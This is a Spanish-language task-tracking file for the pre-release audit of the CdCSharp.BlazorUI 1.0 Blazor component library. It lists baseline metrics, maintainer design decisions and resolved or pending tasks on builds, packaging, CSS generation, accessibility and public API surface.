# TASKS.md — Hallazgos del análisis pre‑producción `CdCSharp.BlazorUI 1.0`

Este archivo se alimenta durante la Fase F1 descrita en `ANALYSIS.md`. Cada entrada corresponde a un hallazgo accionable. El trabajo real (fixes, refactors, optimizaciones) se ejecuta en F2 resolviendo estas tareas.

Convenciones completas en `ANALYSIS.md §1.2`.

## Flujo de resolución (obligatorio, permanente)

Al cerrar cualquier tarea de este archivo:

1. **Commit siempre** los cambios de código de la tarea. No dejar una tarea "resuelta" sin commit.
2. **Incluir `TASKS.md`** en el commit del fix con la tarea marcada `- **Estado**: ✅ Resuelto — <nota breve>` (sin hash todavía). No commitear `TASKS.md` por separado en cada edición intermedia; se consolida al cerrar.
3. **Hash de commit**: tras crear el commit del fix, actualizar la línea a `- **Estado**: ✅ Resuelto (commit `<hash>`) — <nota breve>` con el hash corto (7 chars) y crear un commit de seguimiento `docs(tasks): link <ID> resolution commit hash`. Esto es inevitable porque el propio hash del commit no existe hasta que el commit se crea; el follow-up deja el link trazable sin reescribir historia.
4. Si una tarea se resuelve en varios commits, citar el último (el que cierra) y opcionalmente listar los previos en la nota.

Este flujo es permanente y aplica a todas las tareas pendientes. Sin excepciones salvo orden explícita contraria.

---

## Resumen por área

| Área           | Blockers | Critical | Major | Minor | Polish |
|----------------|---------:|---------:|------:|------:|-------:|
| BLD            |        0 |        3 |     7 |     3 |      2 |
| ARCH           |        0 |        4 |     7 |     5 |      1 |
| BLD-PIPE       |        0 |        3 |     9 |     4 |      1 |
| GEN            |        0 |        2 |     3 |     5 |      3 |
| API            |        0 |        3 |     5 |     4 |      2 |
| BASE           |        0 |        2 |     4 |     4 |      2 |
| COMP           |        0 |        1 |     5 |     3 |      1 |
| CSS-SCOPED     |        0 |        0 |     4 |     3 |      2 |
| CSS-BUNDLE     |        0 |        0 |     1 |     3 |      1 |
| CSS-OPT        |        0 |        0 |     2 |     3 |      1 |
| THEME          |        0 |        0 |     3 |     5 |      2 |
| JS             |        0 |        0 |     6 |     4 |      2 |
| ASYNC          |        0 |        0 |     5 |     4 |      2 |
| A11Y           |        0 |        0 |     4 |     5 |      2 |
| PERF           |        0 |        0 |     3 |     5 |      3 |
| SEC            |        0 |        0 |     4 |     5 |      2 |
| TEST           |        0 |        0 |     4 |     5 |      2 |
| DOC            |        0 |        0 |     4 |     5 |      2 |
| PKG            |        0 |        0 |     4 |     5 |      2 |
| L10N           |        0 |        0 |     4 |     5 |      2 |
| CI             |        0 |        0 |     4 |     5 |      2 |
| DOCS-WASM      |        0 |        0 |     4 |     5 |      2 |
| CLAUDE         |        0 |        0 |     4 |     5 |      2 |
| REL            |        0 |        0 |     4 |     5 |      2 |

---

## Baseline (pre‑F2)

Métricas capturadas antes de iniciar la resolución de tareas. Sirven de referencia para medir mejora al cerrar F2 (§3.24 `REL`).

Fecha: 2026-04-20. Config: `Release`, net10.0, Windows.

| Métrica | Valor | Fuente |
|--------|-------|--------|
| Warnings `dotnet build -c Release` (total solution) | **285** | `dotnet build CdCSharp.BlazorUI.slnx -c Release` |
| Warnings `dotnet build -c Debug` (total solution) | 285 (igual que Release) | idem Debug |
| Warnings src/CdCSharp.BlazorUI | 28 únicos | grep csproj filter |
| Warnings src/CdCSharp.BlazorUI.Core | 0 | — |
| Warnings src/CdCSharp.BlazorUI.BuildTools | 1 único (CS0219) | — |
| Warnings test/CdCSharp.BlazorUI.Tests.Integration | ~203 únicos (406 dup. en log) | — |
| Warnings docs/CdCSharp.BlazorUI.Docs.Wasm | 19 únicos | — |
| Warnings samples/AppTest.Wasm | 15 únicos | — |
| Warnings tools/MaterialIconsScrapper | 9 únicos | — |
| Tests totales | 2 496 | `dotnet test` |
| Tests passed | 2 493 | — |
| Tests failed | **3** | `BUICultureSelector` (Wasm only) |
| Tests skipped | 0 | — |
| Tiempo tests | 4 s | — |
| Build determinista | Sí (md5 byte‑idéntico entre 2 builds limpios) | `md5sum CssBundle/*` |
| LoC razor.css scoped (todos) | 4 838 | `find src -name '*.razor.css'` |
| LoC CssBundle/*.css (generados) | pendiente recompilar | — |
| `wwwroot/css/blazorui.css` tamaño | 40 196 bytes (≈39 KB) | bundle Vite |
| `wwwroot/js/Types/Debug/DebugPanel.min.js` | **34 103 bytes (≈33 KB)** — ⚠️ debug en prod | — |
| Resto módulos JS (suma) | 11 832 bytes | — |
| Total JS interop (sin sourcemaps) | 45 935 bytes (≈45 KB) | — |
| `ConfigureAwait(` hits en src/ | pendiente (§3.13) | — |
| `!important` hits en src/ | pendiente (§3.8/§3.10) | — |
| Cobertura (líneas/ramas) | pendiente (§3.17) | `Test-Coverage.ps1` |

---

## Directivas de diseño (F1 → F2 handoff)

Decisiones confirmadas por el maintainer el 2026-04-21 antes de iniciar F2. Cada tarea afectada referencia esta sección en su campo `Notas`.

### Identidad legal
- **D-01** — Copyright: `© 2026 Samuel Maícas (@cdcsharp)`. Email contacto: `samuel.maicas.development@gmail.com`. Aplica a `LICENSE.txt`, `SECURITY.md`, `CODE_OF_CONDUCT.md`, `README.md`, metadata NuGet.

### Packaging / arquitectura de distribución
- **D-02** — `CdCSharp.BlazorUI.SyntaxHighlight` se publica como paquete NuGet independiente (Opción A). No se absorbe en `BlazorUI` ni se embebe.
- **D-03** — `.targets` redistribuido **no** ejecuta `npm`/`Vite` en el consumidor (Opción C). Los assets CSS/JS se generan en dev del maintainer, se empaquetan pre-bundleados en el `.nupkg` y el consumidor sólo los consume como `static web assets`.
- **D-04** — `DebugPanel.ts` / `DebugPanel.min.js` **se elimina** del repositorio y del paquete. Herramienta personal del maintainer, no forma parte del shipped.
- **D-05** — Artefactos generados (`CssBundle/`, `wwwroot/css`, `wwwroot/js`, `package.json`, `tsconfig.json`, `vite.config*.js`, `.npmrc`, `node_modules/`) quedan en `.gitignore`. Se regeneran en la pipeline de build y se materializan en el `.nupkg` al empaquetar.

### Superficie API pública
- **D-06** — `FeatureDefinitions` pasa a `internal static class` + fachada pública mínima (Opción A). Reduce el contrato SemVer.
- **D-07** — Helpers de patrones de fecha (`DateTimeTokenHelper`, conversores de pattern `.NET ↔ intl`) son `internal`. No se exponen como API pública.
- **D-08** — `BUISize` conserva nomenclatura `Small / Medium / Large` (no se renombra a `SM/MD/LG` ni a `Compact/Standard/Comfortable`).

### CSS / tema
- **D-09** — Atributo de activación de tema se renombra a `data-bui-theme` en los 11 sitios que hoy usan `data-theme` (generator + ts + initializer + 7 `.razor.css`). CLAUDE.md mantiene `data-bui-theme` como valor canónico.
- **D-10** — Nomenclatura de variables CSS de paleta usa **kebab-case**: `PrimaryContrast → --palette-primary-contrast` (no `--palette-primary-contrast`). Migración con nota en release notes (breaking contra overrides externos). `ToCssVariableName` se reescribe para convertir PascalCase a kebab.
- **D-11** — Sombras en tema oscuro usan **elevation overlay** (surface tint por nivel) en lugar de `box-shadow` con alpha. Se añaden variables `--palette-surface-elevation-{1..5}` al contrato de tema.
- **D-12** — `_scrollbar.css` se genera con **su propio generador** (`ScrollbarCssGenerator`) y queda como archivo independiente en `CssBundle/`. Orden de carga en `main.css`: tras `_base.css`, antes de `_transition-classes.css`. Documentar en CLAUDE.md §CSS architecture.
- **D-13** — Forma canónica de selector en `.razor.css` scoped: **short** `[data-bui-component="X"]` (no `bui-component[data-bui-component="X"]`). Blazor CSS isolation añade `[b-xxx]` con specificity suficiente; la forma corta es menos verbose y mantiene aislamiento por scope. CLAUDE.md §regla 2 se actualiza.

### Seguridad
- **D-14** — `BUISvgIcon` adopta **catálogo cerrado** de iconos (no parser SVG arbitrario). API: `Icon="IconKey.Home"` enum/struct de iconos conocidos. `SvgMarkupSanitizer` se retira o se marca `internal` como fallback de emergencia.
- **D-15** — Script de prevención de theme-flash se mantiene **inline en `<head>`** con soporte CSP vía `nonce`. Documentar patrón de integración en guía CSP.

### Localización
- **D-16** — Docs site mantiene soporte bilingüe declarado (`en-US` + `es-ES`). Completar cobertura `.resx` es trabajo de fase posterior; F2 no exige cobertura 100% aquí. DOCS-WASM-01 se reclasifica de bug a debt-tracked.
- **D-17** — Componentes de la librería **deben estar localizados**. L10N-03 añade `.resx` en inglés (neutral) y español para cada componente con texto visible. `IStringLocalizer<T>` se mantiene.

### Proceso
- **D-18** — `CHANGELOG.md` se mantiene **manualmente** (Keep a Changelog). Release notes de GitHub se generan extrayendo la sección correspondiente del CHANGELOG. `--generate-notes` automático queda descartado para evitar dos fuentes de verdad.
- **D-19** — Política de RC: sólo antes de cambios **major** (`2.0.0-rc.N`). Minors y patches publican directo desde `preview.N`.
- **D-20** — Docs site **sin analytics/telemetría**. Ni GA, ni Plausible, ni Cloudflare. Privacy-first por defecto.

---

## Blockers (release‑gating)

_(ninguno registrado todavía)_

---

## Critical

### `BLD-01` — Regresión de 3 tests en `BUICultureSelector` (solo scenario Wasm)

- **Estado**: ✅ Resuelto (commit `5f6604e`)
- **Severidad**: Critical
- **Esfuerzo**: M
- **Alcance**:
  - `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Components/CultureSelector/BUICultureSelectorAccessibilityTests.cs`
  - `test/CdCSharp.BlazorUI.Tests.Integration/Tests/Components/CultureSelector/BUICultureSelectorSnapshotTests.cs`
- **Evidencia**: `dotnet test -c Release` → `Failed: 3, Passed: 2493`.
  - `Should_Have_Title_On_Flag_Buttons(scenario: Wasm)` → `Expected collection not to be empty` en línea 23.
  - `Should_Match_Dropdown_Snapshot(scenario: Wasm)` → snapshot `ui-culture-selector__*` vs markup actual `bui-select__*`.
  - `Should_Match_Flags_Snapshot(scenario: Wasm)` → snapshot `ui-culture-selector__flag-*` vs `bui-culture-selector__flag-*`.
  - `.received.txt` reportados como untracked por git.
- **Criterios de aceptación**:
  1. Los 3 tests pasan en ambos scenarios (Server y Wasm).
  2. Si el cambio de prefijo `ui-` → `bui-` es intencional, los `.verified.txt` se regeneran; si no, se restablece el prefijo esperado en el componente.
  3. `Should_Have_Title_On_Flag_Buttons` o bien refleja el DOM actual o bien el componente Wasm emite los `title` que el test espera.
  4. Investigar por qué solo falla en `Wasm` y no en `Server` (probable diferencia en localización o en el render inicial del host WASM).
- **Notas**: el test que espera colección no vacía sugiere que el componente renderiza sin flags en Wasm — posible race en culture loading bajo `WasmTestContext` vs `ServerTestContext`.

### `BLD-02` — `DisposeAsync` oculta (hides) el miembro base en tres componentes — disposal nunca invocado vía contrato base

- **Estado**: ✅ Resuelto (commit `a8cec9f`)
- **Severidad**: Critical
- **Esfuerzo**: XS
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/BUIDialog.razor:180`
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/BUIDrawer.razor:153`
  - `src/CdCSharp.BlazorUI/Components/Utils/Draggable/BUIDraggable.razor:58`
- **Evidencia**: `warning CS0114: '<X>.DisposeAsync()' hides inherited member 'BUIComponentBase.DisposeAsync()'. To make the current member override that implementation, add the override keyword. Otherwise add the new keyword.`
- **Criterios de aceptación**:
  1. Añadir `override` (o `new` con justificación explícita) en los tres métodos.
  2. Confirmar que la ruta `DisposeAsync` del base se ejecuta (revisar si tenía lógica que quedaba sin correr: cleanup de JS behaviors, event listeners, cascading registrations).
  3. Añadir test de regresión que verifique que el disposal del componente libera recursos (p. ej. no se acumulan instancias en el registry, o se desuscribe de `NavigationManager.LocationChanged` si aplica).
- **Notas**: si `BUIComponentBase.DisposeAsync` no era virtual/overridable, evaluar promoverlo a `public virtual async ValueTask DisposeAsync()`. Revisar con §3.6 `BASE`.

### `BLD-03` — CI rojo: 3 fails + 285 warnings bloquean el gate de release

- **Severidad**: Critical
- **Esfuerzo**: M (meta‑tarea, se cierra cuando `BLD-01..BLD-11` pasan el umbral)
- **Alcance**: meta, agregada sobre todas las tareas `BLD-*`.
- **Evidencia**: build exit=0 pero `285 Warning(s)` y test exit≠0.
- **Criterios de aceptación**:
  1. `dotnet build -c Release` con 0 warnings en proyectos `src/*` (tests y docs pueden quedar con warnings documentados en otras tareas).
  2. `dotnet test -c Release` con 0 failures, 0 skipped sin justificación.
  3. Documentar umbral permitido de warnings por proyecto en `.editorconfig` o `Directory.Build.props` y promover los críticos a errors (`<TreatWarningsAsErrors>true</TreatWarningsAsErrors>` en src).

### `ARCH-01` — Metadatos NuGet ausentes en paquetes publicables

- **Estado**: ✅ Resuelto (commit `6554438`)
- **Severidad**: Critical
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj`, `src/CdCSharp.BlazorUI.Core/*.csproj`, `src/CdCSharp.BlazorUI.BuildTools/*.csproj`.
- **Evidencia**: lectura directa de los `.csproj`. `CdCSharp.BlazorUI.csproj` solo expone `PackageId`, `Authors`, `Description`, `PackageTags`, `Version`. `Core.csproj` y los demás ni siquiera eso.
- **Criterios de aceptación**:
  1. Cada `.csproj` publicable incluye: `PackageId`, `Authors`, `Description` (en inglés, >2 frases), `PackageTags`, `PackageProjectUrl`, `RepositoryUrl`, `RepositoryType=git`, `PackageLicenseExpression` (p. ej. `MIT`), `PackageReadmeFile` (`README.md`), `PackageIcon`, `Copyright`, `IncludeSymbols=true`, `SymbolPackageFormat=snupkg`, `GenerateDocumentationFile=true`, `PublishRepositoryUrl=true`.
  2. `Description` en inglés (la actual es *"Librería de componentes Blazor"* en español, vago).
  3. Validar con `dotnet pack` + `dotnet tool install -g ClariusLabs.NuDoc` (o equivalente) que los metadatos aparecen en el `.nuspec` generado.
- **Notas**: complementa §3.19 `PKG`. Idealmente centralizar en un `Directory.Build.props` (ver `ARCH-05`).

### `ARCH-02` — `CdCSharp.BlazorUI.SyntaxHighlight` es dependencia pero no se publica como NuGet

- **Estado**: ✅ Resuelto (commit `ea0e552`)
- **Severidad**: Critical
- **Esfuerzo**: S
- **Alcance**:
  - `src/CdCSharp.BlazorUI.SyntaxHighlight/CdCSharp.BlazorUI.SyntaxHighlight.csproj` (sin metadatos de paquete).
  - `.github/workflows/publish.yml` (solo empaqueta Core, BlazorUI, BuildTools).
  - `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj:47` (referencia via `ProjectReference`).
- **Evidencia**: workflow líneas 195‑217 solo hace `dotnet pack` para Core, BlazorUI, BuildTools. `SyntaxHighlight` no tiene `PackageId`/metadatos.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-02]** Publicar `CdCSharp.BlazorUI.SyntaxHighlight` como paquete NuGet independiente: añadir metadatos (`PackageId`, `Authors`, etc.), incluir en `publish.yml` (`dotnet pack` + `dotnet nuget push`).
  2. `CdCSharp.BlazorUI.csproj` mantiene `<ProjectReference>` en dev pero declara dependencia NuGet en el `.nupkg` final (`<PackageReference Include="CdCSharp.BlazorUI.SyntaxHighlight" Version="$(Version)" />` al empaquetar, o transformar via `PrivateAssets` + `IncludeAssets`).
  3. Consumidor puede instalar `CdCSharp.BlazorUI` y usar `BUICodeBlock` sin errores de restore.
- **Notas**: release blocker real: si alguien instala 1.0.0 hoy, falla. Mismo análisis aplica a `Localization.Server` / `Localization.Wasm` (ver `ARCH-04`). Decisión D-02 (ver §Directivas de diseño): Opción A confirmada.

### `ARCH-03` — `CdCSharp.BlazorUI.targets` distribuido vía NuGet usa rutas locales

- **Estado**: ✅ Resuelto (commit `eaffb39`)
- **Severidad**: Critical
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI/_build/CdCSharp.BlazorUI.targets`.
- **Evidencia**: líneas 6‑7 definen `BuildToolsExe` y `BuildToolsDll` como `$(MSBuildProjectDirectory)\..\CdCSharp.BlazorUI.BuildTools\bin\$(Configuration)\net10.0\...`. En consumidor, `$(MSBuildProjectDirectory)` es su proyecto; no hay `../CdCSharp.BlazorUI.BuildTools`. El target `BuildBlazorUIAssets` (línea 11) ejecuta `$(BuildToolsExe)` que no existe → falla el build del consumidor.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-03]** El consumidor **no** ejecuta `npm`/`Vite`/`BuildTools.exe`. Assets (`wwwroot/css/blazorui.css`, `wwwroot/js/**`) se generan en la build del maintainer, se empaquetan pre-bundleados en el `.nupkg` como `<Content Include>` + `PackagePath="staticwebassets/**"`.
  2. Desempaquetar el `.targets` redistribuido: eliminar los `<Exec>` que invocan `BuildToolsExe`/`BuildToolsDll` en el `.targets` que viaja en el `.nupkg`. Mantener un `.targets` local separado (`_build/CdCSharp.BlazorUI.Dev.targets`) que sólo se importa en el monorepo vía `Condition="Exists(...)"` para la pipeline de generación de assets.
  3. Probar instalando el `.nupkg` resultante en un proyecto limpio (sin Node, sin npm) y ejecutar `dotnet build`; pasar sin errores y sin descargar dependencias JS.
  4. El `<Content Include>` de `wwwroot` (líneas 31‑34) debe apuntar a rutas válidas dentro del `.nupkg` (`contentFiles/any/any/staticwebassets/...`).
  5. Documentar el nuevo flujo en `CLAUDE.md` (ver `CLAUDE-02`).
- **Notas**: el `<Content Include>` de `wwwroot` en líneas 31‑34 también se ejecutaría en consumidor con rutas inválidas — revisar. Decisión D-03 (ver §Directivas de diseño): Opción C confirmada — consumer nunca corre npm/Vite.

### `BLD-PIPE-01` — Reset CSS elimina `:focus-visible` globalmente (WCAG 2.4.7)

- **Estado**: ✅ Resuelto (commit `f90e50c`)
- **Severidad**: Critical
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/ResetGenerator.cs:51`.
- **Evidencia**: el generator emite `:focus-visible{ outline: none; }` dentro de `_reset.css` (bundle global). Afecta a cualquier elemento del consumidor, no solo a los componentes de la librería. Viola WCAG 2.4.7 (Focus Visible) salvo que cada componente restaure el outline, cosa que hoy no ocurre uniformemente. También fija `outline: none` en `button, input, select, textarea` (línea 43‑49).
- **Criterios de aceptación**:
  1. Eliminar la regla global `:focus-visible { outline: none; }`. El reset puede seguir suprimiendo `outline` en la regla "normalizadora" de form controls solo si luego se restaura un focus ring coherente a nivel de `bui-component[...]:focus-visible`.
  2. Añadir regla global (`_base.css` o `_tokens.css`) `bui-component:focus-visible { outline: var(--bui-highlight-outline); outline-offset: var(--bui-highlight-outline-offset); }`.
  3. Validar con axe/Lighthouse 0 issues de focus‑visible sobre docs.
- **Notas**: alimenta también `A11Y-xx`.

### `BLD-PIPE-02` — `.targets` no propaga `ExitCode` de BuildTools y reglas `<Exec>` silencian errores

- **Estado**: ✅ Resuelto (commit `95cb3a0`)
- **Severidad**: Critical
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/_build/CdCSharp.BlazorUI.targets:19‑27`.
- **Evidencia**: ambos `<Exec>` usan `ConsoleToMSBuild="true"` y `ContinueOnError="false"`, pero no capturan `IgnoreExitCode`/`ExitCode` a una propiedad ni existe validación post‑exec. Si BuildTools falla a mitad de pipeline (p. ej. `npm install` revienta), MSBuild reporta el error del `<Exec>` pero no queda trazabilidad clara y los targets posteriores (`<Content Include>`) se ejecutan igualmente agregando globs vacíos.
- **Criterios de aceptación**:
  1. Capturar `ExitCode`/`ConsoleOutput` a propiedades (`Output TaskParameter="ExitCode" PropertyName="_BuildToolsExit"`) y condicionar el `<ItemGroup>` de `<Content Include>` a `'$(_BuildToolsExit)' == '0'`.
  2. Fallar el build de forma explícita si `CssBundle/` o `wwwroot/css/blazorui.css` no existen tras el exec (`<Error Condition="…" />`).
  3. Añadir log (`Importance="high"`) con la versión de BuildTools y de Node/npm/Vite en uso.
- **Notas**: complementa `ARCH-03` (mismo target, distinto ángulo: uno habla de distribución, este de robustez local).

### `BLD-PIPE-03` — `DataCollectionFamilyCssGenerator` no usa `FeatureDefinitions` (todo hardcoded) e introduce `@media (max-width: 768px)` contra estándar

- **Estado**: ✅ Resuelto (commit `5063c4c`)
- **Severidad**: Critical
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/Families/DataCollectionFamilyCssGenerator.cs` (todo el archivo).
- **Evidencia**:
  - Todo el CSS es una cadena literal. Ningún `FeatureDefinitions.DataAttributes.DataCollectionBase` / `FeatureDefinitions.CssClasses.DataCollection.*` interpolado (contrastar con `InputFamilyGenerator` / `PickerFamilyGenerator`). Rompe la regla CLAUDE "`FeatureDefinitions` es la única fuente de verdad".
  - Las clases `bui-dc__toolbar`, `bui-dc__filter`, `bui-dc__selection-info`, `bui-dc__page-size`, `bui-dc__pagination`, `bui-dc__pagination-info`, `bui-dc__pagination-controls`, `bui-dc__checkbox`, `bui-dc__empty`, `bui-dc__empty-icon`, `bui-dc__empty-text`, `bui-dc__loading`, `bui-dc__toolbar-spacer` no existen en `FeatureDefinitions.CssClasses` (sí están `Input` y `Picker`).
  - Selectores usan `[data-bui-data-collection]` sin el prefijo `bui-component[...]`, contrario a lo que hacen Input/Picker. Colisión potencial con HTML ajeno del consumidor que tenga ese atributo.
  - Líneas 158‑178: `@media (max-width: 768px)` — prohibido por `CLAUDE.md` regla 5 (sizing via `--bui-size-multiplier`, no breakpoints).
- **Criterios de aceptación**:
  1. Añadir `FeatureDefinitions.CssClasses.DataCollection.*` con todas las clases anteriores y `FeatureDefinitions.DataAttributes.DataCollectionBase` ya usado.
  2. Refactorizar el generator para interpolar todas las constantes (cero literales de clase o atributo).
  3. Usar siempre `bui-component[{{dc}}] .{{clase}}` (consistente con las otras familias).
  4. Eliminar el `@media`. Mover el comportamiento responsive a `flex-wrap` / `gap` basado en `--bui-density-multiplier` o a una variable `--_dc-breakpoint` que el consumidor pueda sobreescribir.
- **Notas**: también aflorará en §3.8/§3.9/§3.10.

### `ARCH-04` — `Localization.Server` y `Localization.Wasm` no se publican

- **Estado**: ✅ Resuelto (commit `48fdc3a`)
- **Severidad**: Critical
- **Esfuerzo**: S
- **Alcance**: `.github/workflows/publish.yml`, `src/CdCSharp.BlazorUI.Localization.{Server,Wasm}/*.csproj`.
- **Evidencia**: workflow no invoca `dotnet pack` sobre estos proyectos. `.csproj` no definen `PackageId`, `IsPackable`, `GeneratePackageOnBuild`.
- **Criterios de aceptación**:
  1. Ambos proyectos empaquetables, con metadatos completos (ver `ARCH-01`).
  2. Workflow publica ambos paquetes.
  3. README documenta cómo elegir entre Server/WASM.
- **Notas**: si la librería no ofrece localización lista para usar, el feature queda inaccesible para el consumidor tras NuGet install.

---

### `GEN-01` — `ColorClassGenerator` emite `INamedTypeSymbol` al pipeline incremental: caching roto, regeneración completa por cualquier cambio

- **Estado**: ✅ Resuelto (commit `44dbd63`)
- **Severidad**: Critical
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core.CodeGeneration/ColorClassGenerator.cs:33-46`.
- **Evidencia**: `ClassToGenerate` es un `record(INamedTypeSymbol Symbol, int VariantLevels)`. `IncrementalValuesProvider<ClassToGenerate>` se usa en `Combine(CompilationProvider)` + `Collect()` + `Distinct()`. `INamedTypeSymbol` no es equatable entre compilaciones (referencia distinta cada vez), por lo que el cache incremental se invalida en cada keystroke del IDE. Genera 1 551 propiedades (141 colores × 11 props con `variantLevels=5`) — el coste de regeneración es significativo.
- **Criterios de aceptación**:
  1. El transform `GetSemanticTarget` devuelve un DTO serializable con campos `string NamespaceName`, `string ClassName`, `int VariantLevels` (todo primitivos o records con value-equality).
  2. `INamedTypeSymbol` no sobrevive al borde del transform.
  3. Benchmark: medición de tiempo de regeneración tras editar un archivo sin tocar `[AutogenerateCssColors]` → debe ser ≤10 ms (pipeline cacheado).
  4. Tests: añadir un test que verifique que dos compilaciones sucesivas con el mismo source yielden el mismo `ClassToGenerate` por equality.
- **Notas**: patrón documentado en el "Incremental Generators Cookbook" de Roslyn — transform SIEMPRE a tipo-valor antes de `Collect()`/`Combine()`.

---

### `API-01` — Clases concretas de JS interop marcadas `public sealed`: 9 implementaciones expuestas como superficie pública hacen inmutables los detalles de integración JS

- **Estado**: ✅ Resuelto (commit `d611e6e`)
- **Severidad**: Critical
- **Esfuerzo**: S
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Services/JsInterop/BehaviorJsInterop.cs:7` — `public sealed class BehaviorJsInterop`.
  - `src/CdCSharp.BlazorUI/Components/Utils/Clipboard/ClipboardJsInterop.cs:12` — `public sealed class ClipboardJsInterop`.
  - `src/CdCSharp.BlazorUI/Components/Forms/Color/JsInterop/ColorPickerJsInterop.cs:15` — `public sealed class ColorPickerJsInterop`.
  - `src/CdCSharp.BlazorUI/Components/Utils/Draggable/JsInterop/DraggableJsInterop.cs:18` — `public sealed class DraggableJsInterop`.
  - `src/CdCSharp.BlazorUI/Components/Forms/Dropdown/JsInterop/DropdownJsInterop.cs:23` — `public sealed class DropdownJsInterop`.
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/JsInterop/ModalJsInterop.cs:21` — `public sealed class ModalJsInterop`.
  - `src/CdCSharp.BlazorUI/Components/Utils/Patterns/JsInterop/PatternJsInterop.cs:28` — `public sealed class PatternJsInterop`.
  - `src/CdCSharp.BlazorUI/Components/Forms/TextArea/JsInterop/TextAreaJsInterop.cs:15` — `public sealed class TextAreaJsInterop`.
  - `src/CdCSharp.BlazorUI/Components/Layout/ThemeSelector/ThemeJsInterop.cs:22` — `public sealed class ThemeJsInterop`.
- **Evidencia**: las interfaces `I*JsInterop` ya están expuestas para abstraer. Las implementaciones concretas no tienen uso legítimo fuera de la DI — cualquier consumidor debería inyectar la interfaz. Publicarlas implica que renombrar un método privado, cambiar una ruta de módulo o ajustar el contrato de `ModuleJsInteropBase` se convierte en breaking change para `SemVer`.
- **Criterios de aceptación**:
  1. Cambiar las 9 clases a `internal sealed class`.
  2. Mantener las interfaces públicas.
  3. Registrar en DI con `services.AddScoped<IBehaviorJsInterop, BehaviorJsInterop>()` (o el lifetime correspondiente) desde `ServiceCollectionExtensions`.
  4. Tests: `Library/ServiceRegistrationTests` sigue resolviendo por interfaz; borrar cualquier test que instancie la clase concreta.
- **Notas**: decisión equivalente aplica a `VariantRegistry` (ver `API-04`).

---

### `API-02` — `FeatureDefinitions` es `public static class`: todas las constantes `data-bui-*` / `--bui-inline-*` / `bui-*` quedan congeladas como contrato público

- **Estado**: ✅ Resuelto (commit `be3ec9b`)
- **Severidad**: Critical
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Css/FeatureDefinitions.cs:7` (namespace `CdCSharp.BlazorUI.Components`).
- **Evidencia**: `FeatureDefinitions` centraliza TODOS los nombres que forman el contrato interno CSS↔DOM (visto en `BUIComponentAttributesBuilder`, generadores de `BuildTools`, y 50+ `.razor.css`). Publicar la clase significa que:
  - Renombrar `data-bui-input-base` → `data-bui-input` es breaking change.
  - Mover la constante `Ripple = "bui-ripple"` a otra clase anidada es breaking change.
  - Cada iteración de refactor CSS requiere bump mayor de SemVer.
  
  Los consumidores no necesitan estas constantes (el estilado se hace configurando las props del componente o escribiendo `.css` que selecciona sobre los mismos atributos — pero via cadena literal, no referenciando la constante).
- **Criterios de aceptación**:
  1. **[Decisión F1 D-06]** Cambiar a `internal static class FeatureDefinitions` (Opción A).
  2. `InternalsVisibleTo` a `CdCSharp.BlazorUI`, `CdCSharp.BlazorUI.BuildTools`, `CdCSharp.BlazorUI.Tests.Integration` (añadir los que no existan ya en `Core.csproj`).
  3. Extraer a una fachada **pública mínima** `public static class BUIStylingKeys` (namespace `CdCSharp.BlazorUI.Core.Css`) SOLO los miembros que un consumidor pueda necesitar para escribir CSS/tests contra el framework: `BUIStylingKeys.Size`, `BUIStylingKeys.Density`, `BUIStylingKeys.Variant`, `BUIStylingKeys.InlineColor`, `BUIStylingKeys.InlineBackground`, `BUIStylingKeys.Component` (nombre del data-attribute raíz). El resto (familias, transition classes, clases BEM internas) queda internal.
  4. Verificar que `BuildTools/Generators/*.cs` acceden via `ProjectReference` a Core (ya referenciado); los generators siguen compilando con la clase internal.
  5. Documentar en `CLAUDE.md` la separación "internal contract vs public facade" — ver `CLAUDE-xx`.
- **Notas**: este cambio es pre-requisito para poder evolucionar CSS post-1.0 sin bump mayor. Alimenta `CLAUDE-xx`: documentar la separación "internal surface vs public surface" explícitamente. Decisión D-06 (ver §Directivas de diseño): Opción A con fachada mínima `BUIStylingKeys`.

---

### `API-03` — Sin `Microsoft.CodeAnalysis.PublicApiAnalyzers` / `PublicAPI.{Shipped,Unshipped}.txt`: cualquier PR puede romper la API sin que CI lo detecte

- **Estado**: ✅ Resuelto parcialmente (baseline instalado, commit `8a94bd7`) — analyzer + archivos vacíos en los 5 proyectos publicables, workflow documentado en `CLAUDE.md` → "Public API tracking". Criterio 4 (gate CI) y criterio 5 (poblar `PublicAPI.Shipped.txt`) quedan pendientes hasta que API-01/02/04/06/08..14 cierren y BLD-03 active `TreatWarningsAsErrors`.
- **Severidad**: Critical
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj`, `src/CdCSharp.BlazorUI.Core/CdCSharp.BlazorUI.Core.csproj`.
- **Evidencia**: `find . -name "PublicAPI*.txt"` devuelve vacío. Ningún `.csproj` referencia `Microsoft.CodeAnalysis.PublicApiAnalyzers`. Para un paquete 1.0 donde aparecen 90+ tipos públicos entre Core y BlazorUI, esta herramienta es el mecanismo estándar para bloquear cambios de API inadvertidos.
- **Criterios de aceptación**:
  1. Añadir `<PackageReference Include="Microsoft.CodeAnalysis.PublicApiAnalyzers" Version="3.11.0" PrivateAssets="all" />` a ambos csproj publicables (BlazorUI, Core, SyntaxHighlight, Localization.{Server,Wasm}).
  2. Generar `PublicAPI.Shipped.txt` y `PublicAPI.Unshipped.txt` vacíos inicialmente; el analyzer reporta RS0016/RS0017 hasta que se declaren todos los miembros públicos.
  3. Documentar en `CLAUDE.md` → `CLAUDE-xx` el workflow: cambios a superficie pública requieren entrada en `PublicAPI.Unshipped.txt`, que pasa a `Shipped.txt` al hacer release.
